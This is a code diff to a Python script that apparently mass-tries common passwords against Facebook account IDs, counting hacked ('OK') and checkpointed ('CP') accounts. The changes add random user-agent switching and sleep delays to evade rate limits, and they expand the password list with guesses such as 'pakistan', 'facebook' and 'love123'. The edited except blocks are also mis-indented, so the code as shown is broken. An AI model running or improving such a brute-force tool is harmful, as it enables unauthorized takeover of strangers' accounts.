@@ -43,7 +43,7 @@ for xd in range(10000):
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
         l='Mobile Safari/537.36'
-        uaku2 = f'{aa} {b}; {c}) \x1b[38;5;46m{h}.{i}.{j}.{k} {l}'
+        uaku2 = f'{aa} {b}; {c}) {h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 def windows():
     aV=str(random.choice(range(10,20)))
@@ -71,7 +71,7 @@ for agenku in range(10000):
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36'
-  uakuh=f'{a} {b}; {c}{d}{e}{f}) \x1b[38;5;46m{h}.{i}.{j}.{k} {l}'
+  uakuh=f'{a} {b}; {c}{d}{e}{f}) {h}.{i}.{j}.{k} {l}'
   ugen.append(uakuh)
 for ua in range(10000):
       a='Mozilla/5.0 (Linux; Android'
@@ -820,9 +820,13 @@ def login1(uid):
             f'\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]'
         )
         sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
+        if random.randint(0, 1):
+            ua = random.choice(ugen)
+        else:
+            ua = windows()
+        time.sleep(random.uniform(2, 4))    
+        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+            time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -882,7 +886,7 @@ def login1(uid):
                 continue
         loop += 1
     except Exception as e:
-        time.sleep(30)
+    time.sleep(random.uniform(5, 10))
 
 def login2(uid):
     global oks,loop,cps
@@ -890,9 +894,13 @@ def login2(uid):
     try:
         sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456","1234567","12345678","123456789","111222"]:
+        if random.randint(0, 1):
+            ua = random.choice(ugen)
+        else:
+            ua = windows()
+        time.sleep(random.uniform(2, 4))
+        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+            time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -949,16 +957,20 @@ def login2(uid):
                 continue
         loop += 1
     except Exception as e:
-        time.sleep(30)
+    time.sleep(random.uniform(5, 10))
 def login3(uid):
     global oks, loop, cps
     Session = requests.session()
     try:
         sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
+        if random.randint(0, 1):
+            ua = random.choice(ugen)
+        else:
+            ua = windows()
+        time.sleep(random.uniform(2, 4))
+        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+            time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1015,7 +1027,7 @@ def login3(uid):
                 continue
         loop += 1
     except Exception as e:
-        time.sleep(30)
+    time.sleep(random.uniform(5, 10))
 
 def login4(uid):
     global oks, loop, cps
@@ -1023,9 +1035,13 @@ def login4(uid):
     try:
         sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\33[38;5;37m-\x1b[38;5;46mB4\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;46m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;46m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
         sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
+        if random.randint(0, 1):
+            ua = random.choice(ugen)
+        else:
+            ua = windows()
+        time.sleep(random.uniform(2, 4))
+        for pw in ["123456","1234567","12345678","123456789","111222","password","facebook","admin","123123","111111","000000","pakistan","muslim","love123","qwerty","abc123"]:
+            time.sleep(random.uniform(1, 2))
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -1082,6 +1098,6 @@ def login4(uid):
                 continue
         loop += 1
     except Exception as e:
-        time.sleep(30)
+    time.sleep(random.uniform(5, 10))
 if __name__ == "__main__":
     main()
